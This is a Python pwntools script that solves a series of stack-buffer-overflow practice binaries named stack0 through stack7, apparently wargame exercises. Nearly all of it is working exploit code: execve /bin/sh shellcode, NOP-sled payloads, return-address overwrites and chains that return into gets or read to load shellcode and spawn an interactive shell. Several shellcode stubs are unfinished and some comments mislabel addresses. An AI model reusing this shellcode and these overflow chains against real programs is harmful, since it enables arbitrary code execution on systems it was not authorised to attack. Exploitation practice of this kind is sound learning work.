#!/usr/bin/python
#
from pwn import *

# p.poll() # exit code

shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"

def stack0():
	def overflow_var():
		p = process("./stack0")
		# raw_input("debug?")

		payload = "A"*64                # buf esp+0x1c
		payload += 'AAA'                # check esp+0x5c

		p.sendline(payload)
		print p.recvline()

		p.interactive()
		p.close()

	def exec_shellcode():
		# ASLR off
		# NX off
		p = process("./stack0")
		# raw_input("PID = " + str(p.proc.pid))

		buf = 0xffffcf5c  # fix this address if ASLR disable
		print "buf @ %s"%hex(buf)


		payload = ''
		payload += "\x90" * (80 - len(shellcode))
		payload += shellcode
		payload += p32(buf)

		# payload = 'A' * 80
		print payload.encode("hex")

		p.sendline(payload)

		# raw_input("debug?")
		p.interactive()

		p.close()

	def ropfunc():
		# assuming:
		# 		ASLR off
		# 		NX on
		#


		# full the buffer
		payload  = "\x90" * 80		# to pad

		# write stdin to .dynamic using read@plt
		payload += p32(0xf7ed7980)	   # read()'s addr in ret
		# payload += p32(0x80494a6)      # 0x80494a6: pop esi; pop edi; pop ebp; ret
		payload += p32(0x0804954c)     # return to shellcode in .dynamic after writing shellcode
		payload += p32(0)              # stdin
		payload += p32(0x0804954c)     # .dynamic
		payload += p32(len(shellcode)) # len of shellcode

		p = process("./stack0")
		# raw_input("PID = " + str(p.proc.pid))

		p.sendline(payload)

		p.sendline(shellcode)

		p.interactive()

		p.close()

	# overflow_var()
	# exec_shellcode()
	ropfunc()

# stack0()

def stack1():
	# ret @ ebp + 0x4
	# argc @ ebp + 0x8
	# programe name @ ebp + 0xc
	# argv[1] @ ebp + 0x16
	# check @ esp + 0x5c
	# buf @ esp + 0x1c

	context.arch      = 'i386'
	context.os        = 'linux'
	context.endian    = 'little'
	context.bits = 32

	def overflow_var():
		args = 'dcba' * 17 						# strcpy(buf, argv[1])
										   		# if (check != 0x61626364)
		p = process(["./stack1", args], aslr=False)

		# raw_input("PID = " + str(p.proc.pid))

		# p.interactive()

		print "\n>>> " + p.recvline()

		# raw_input("debug?")
		p.close()

	def exec_shellcode():

		buf = 0xffffcf6c  # fix this address if aslr disable
		print "buf %s"%hex(buf)

		# cover 18 double word in stack to reach ret
		args = '\x90' * (80 - len(shellcode))
		args += shellcode
		args += p32(buf)

		p = process(["./stack1", args])
		# raw_input("PID = " + str(p.proc.pid))
		print "args = '%s'"%(":".join(x.encode('hex') for x in args))

		# raw_input("Running ... ")

		p.interactive()

		p.close()

	def ropfunc():

		# full the buffer
		payload  = "\x90" * 80		# to pad

		# write stdin to .dynamic using gets@plt
		payload += p32(0xf7e613e0)	   # gets()'s addr in ret
		# payload += p32(0x80494a6)      # 0x80494a6: pop esi; pop edi; pop ebp; ret
		payload += p32(0x08049628)     # return to shellcode in .dynamic after writing shellcode
		payload += p32(0x08049628)     # .dynamic

		p = process(["./stack1", payload])
		# raw_input("PID = " + str(p.proc.pid))

		p.sendline(shellcode)

		p.interactive()

		p.close()

	# overflow_var()
	# exec_shellcode()
	ropfunc()

# stack1()

def stack2():
	# C source:
	#     char *addr = getenv("GREENIE");
	#     int modified = 0;
	#     int size = 80;
	#     char buf[size];
	#     strcpy(buf, addr);
	#     if (modified != 0xd0a0d0a)

	context.arch      = 'i386'
	context.os        = 'linux'
	context.endian    = 'little'
	context.bits = 32


	def overflow_var():
		os.environ['GREENIE'] = "\n\r\n\r"*17

		p = process("./stack2")

		# raw_input("PID = " + str(p.proc.pid))

		print "\n" + p.recvline()

		p.close()

	def exec_shellcode():
		# DONT WANNA DO THIS, SO IT WILL NOT WORK

		# ASLR off
		# NX off
		#
		# eip @ buf + 84

		p = process("./stack0")

		buf = 0xffffcf5c  # fix this address if ASLR disable
		print "buf @ %s"%hex(buf)


		payload = ''

		p.sendline(payload)

		raw_input("debug?")
		p.interactive()

		p.close()

	def ropfunc():

		# full the buffer
		payload  = "\x90" * 84		# to pad

		# write stdin to .dynamic using gets@plt
		payload += p32(0xf7e613e0)	   # gets()'s addr in ret
		payload += p32(0x08049674)     # return to shellcode in .dynamic after writing shellcode
		payload += p32(0x08049674)     # .dynamic

		# set GREENIE
		os.environ['GREENIE'] = payload

		p = process("./stack2")
		# raw_input("PID = " + str(p.proc.pid))

		p.sendline(shellcode)

		p.interactive()

		p.close()

	# overflow_var()
	# exec_shellcode()
	ropfunc()

# stack2()

def stack3():
    # C source:
    # win():
    #		printf("code flow successfully changed");
    #
    # main():
	#	 	int check = 0;
	#	 	char buf[80]; // buf'size is not correct coz it is guessed
	#	 	gets(buf);
	#	 	if (check != 0) {
	#	 		printf("calling function pointer, jumping to %p", &check);
	#	 		((void *)(&check))();
	#	 	}

	context.arch      = 'i386'
	context.os        = 'linux'
	context.endian    = 'little'
	context.bits = 32


	def overflow_var():
		payload = "*\x84\x04\x08" * 17       # call win via check

		p = process("./stack3")

		p.sendline(payload)

		print "\n" + p.recvline()
		print p.recvline()

		p.close()

	def exec_shellcode():
		# DONT WANNA DO THIS, SO IT WILL NOT WORK

		# ASLR off
		# NX off
		#
		# eip @ buf + 80

		buf = 0xffffcf5c  # fix this address if ASLR disable
		print "buf @ %s"%hex(buf)

		payload = ''

		p.interactive()

		p.close()

	def ropfunc():

		# full the buffer
		payload  = "*\x84\x04\x08" * 17             # call win via check
		payload += "\x90" * (80 - len(payload))     # to pad

		# write stdin to .dynamic using gets@plt
		payload += p32(0xf7e613e0)	   # gets()'s addr in ret
		payload += p32(0x080495a8)     # return to shellcode in .dynamic after writing shellcode
		payload += p32(0x080495a8)     # .dynamic

		p = process("./stack3")

		p.sendline(payload)
		p.sendline(shellcode)

		p.interactive()

		p.close()

	# overflow_var()
	# exec_shellcode()
	ropfunc()

# stack3()

def stack4():
    # C source:
    # win():
    #		printf("code flow successfully changed");
    #
    # main():
	#	 	char buf[80]; // buf'size is not correct coz it is guessed
	#	 	gets(buf);
	#	 	return 0;

	# gdb-peda$ p &exit
	# $5 = (<text variable, no debug info> *) 0xf7e309d0 <exit>
	# gdb-peda$ p &gets
	# $6 = (<text variable, no debug info> *) 0xf7e613e0 <gets>

	# $eip = buf + 76
	# $ebp = buf + 72

	context.arch      = 'i386'
	context.os        = 'linux'
	context.endian    = 'little'
	context.bits = 32


	def overflow_var():
		payload  = p32(0x80483fa) * (80 // 4)       # call print in win()

		p = process("./stack4")

		p.sendline(payload)

		print "\n" + p.recvline()

		p.close()

	def exec_shellcode():
		# DONT WANNA DO THIS, SO IT WILL NOT WORK

		buf = 0xffffcf5c  # fix this address if ASLR disable
		print "buf @ %s"%hex(buf)

		payload = ''

		p.interactive()

		p.close()

	def ropfunc():

		# full the buffer
		payload  = "\x90" * 76         # to pad

		# write stdin to .dynamic using gets@plt
		payload += p32(0xf7e613e0)	   # gets()'s addr in ret
		payload += p32(0x08049518)     # return to shellcode in .dynamic after writing shellcode
		payload += p32(0x08049518)     # .dynamic

		p = process("./stack4")

		p.sendline(payload)
		p.sendline(shellcode)

		p.interactive()

		p.close()

	# overflow_var()
	# exec_shellcode()
	ropfunc()

# stack4()

def stack5():
    # C source:
    # main():
	#	 	char buf[80]; // buf'size is not correct coz it is guessed
	#	 	gets(buf);
	#	 	return 0;

	# gdb-peda$ p exit
	# $8 = {<text variable, no debug info>} 0xf7e309d0 <exit>
	# gdb-peda$ p gets
	# $9 = {<text variable, no debug info>} 0xf7e613e0 <gets>

	# $eip = buf + 76
	# $ebp = buf + 72

	context.arch      = 'i386'
	context.os        = 'linux'
	context.endian    = 'little'
	context.bits = 32

	def exec_shellcode():
		# DONT WANNA DO THIS, SO IT WILL NOT WORK

		buf = 0xffffcf5c  # fix this address if ASLR disable
		print "buf @ %s"%hex(buf)

		payload = ''

		p.interactive()

		p.close()

	def ropfunc():

		# full the buffer
		payload  = "\x90" * 76         # to pad

		# write stdin to .dynamic using gets@plt
		payload += p32(0xf7e613e0)	   # gets()'s addr in ret
		payload += p32(0x080494b8)     # return to shellcode in .dynamic after writing shellcode
		payload += p32(0x080494b8)     # .dynamic

		p = process("./stack5")

		p.sendline(payload)
		p.sendline(shellcode)

		p.interactive()

		p.close()

	# exec_shellcode()
	ropfunc()

# stack5()

def stack6():
    # C source:
    # void getpath();
    # main():
	#	 	getpath();
	#	 	return 0;
	#
	# void getpath() {
	# 	printf("input path please: ");
	# 	fflush(stdout);
	# 	char buf[48];
	# 	gets(buf);

	# 	// at ebp-0xc
	# 	void *ptr_ret = __builtin_return_address(0); // get ret addr

	# 	ptr_ret &= 0xbf000000;
	# 	if (ptr_ret == 0xbf000000) {
	# 		printf("bzzzt (%p)\n", ptr_ret);
	# 		exit(1);
	# 	}
	# 	printf("got path %s\n", buf);
	# }

	# gdb-peda$ p exit
	# $8 = {<text variable, no debug info>} 0xf7e309d0 <exit>
	# gdb-peda$ p gets
	# $9 = {<text variable, no debug info>} 0xf7e613e0 <gets>

	# $eip = buf + 80
	# $ebp = buf + 76

	context.arch      = 'i386'
	context.os        = 'linux'
	context.endian    = 'little'
	context.bits = 32

	def overflow_var():
		# full the buffer
		payload  = "\x90" * 80         # to pad

		# write stdin to .dynamic using gets@plt
		payload += p32(0xbf000000)	   # gets()'s addr in ret

		p = process("./stack6")

		p.sendline(payload)

		print p.recvall()

		p.close()

	def ropfunc():

		# full the buffer
		payload  = "\x90" * 80         # to pad

		# write stdin to .dynamic using gets@plt
		payload += p32(0x08048380)	   # gets()'s addr in ret
		payload += p32(0x08049668)     # return to shellcode in .dynamic after writing shellcode
		payload += p32(0x08049668)     # .dynamic

		p = process("./stack6")

		p.sendline(payload)
		p.sendline(shellcode)

		# p.sendline("id\nwhoami")
		# print p.recvline()
		# print p.recvline()
		p.interactive()

		p.close()

	overflow_var()
	# ropfunc()

# stack6()

def stack7():
    # C source:
    #	 void getpath();
    #	 main() {
	#		 	getpath();
	#		 	return 0;
	#	 }
	#
	#	 void getpath() {
	#	 	printf("input path please: ");
	#	 	fflush(stdout);
	#	 	char buf[48];
	#	 	gets(buf);
	#
	#	 	// at ebp-0xc
	#	 	void *ptr_ret = __builtin_return_address(0); // get ret addr
	#
	#	 	ptr_ret &= 0xb0000000;
	#	 	if (ptr_ret == 0xb0000000) {
	#	 		printf("bzzzt (%p)\n", ptr_ret);
	#	 		exit(1);
	#	 	}
	#	 	printf("got path %s\n", buf);
	#		strdup(buf); // return a pointer to new string
	#					 // need to free it via free(char* str)
	#	 }

	#	 $eip = buf + 80
	#	 $ebp = buf + 76

	context.arch      = 'i386'
	context.os        = 'linux'
	context.endian    = 'little'
	context.bits = 32

	def overflow_var():
		# full the buffer
		payload  = "\x90" * 80         # to pad

		# write stdin to .dynamic using gets@plt
		payload += p32(0xb0000000)	   # gets()'s addr in ret

		p = process("./stack7")

		p.sendline(payload)

		print p.recvall()

		p.close()

	def ropfunc():

		# full the buffer
		payload  = "\x90" * 80         # to pad

		# write stdin to .dynamic using gets@plt
		payload += p32(0x08048380)	   # gets()'s addr in ret
		payload += p32(0x08049668)     # return to shellcode in .dynamic after writing shellcode
		payload += p32(0x08049668)     # .dynamic

		p = process("./stack7")

		p.sendline(payload)
		p.sendline(shellcode)

		# p.sendline("id\nwhoami")
		# print p.recvline()
		# print p.recvline()
		p.interactive()

		p.close()

	overflow_var()
	# ropfunc()

stack7()
